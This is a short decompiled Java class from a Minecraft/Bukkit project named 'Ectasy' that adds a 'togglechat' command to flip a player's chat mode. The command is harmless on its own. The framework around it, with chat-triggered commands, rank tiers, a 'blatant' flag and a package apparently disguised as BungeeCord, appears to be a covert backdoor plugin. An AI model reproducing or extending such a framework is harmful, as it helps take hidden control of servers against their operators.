package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "togglechat",
   description = "If toggled, sends messages in chat if its not a valid Ectasy command",
   blatant = false,
   rank = Rank.FREE,
   aliases = {"tchat", "tc"}
)
public class ToggleChatCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      var4.chatModeEnabled = !var4.chatModeEnabled;
      ChatUtil.sendChat(var4.player, "Chat mode has been " + (var4.chatModeEnabled ? "&aenabled" : "&cdisabled"));
   }
}
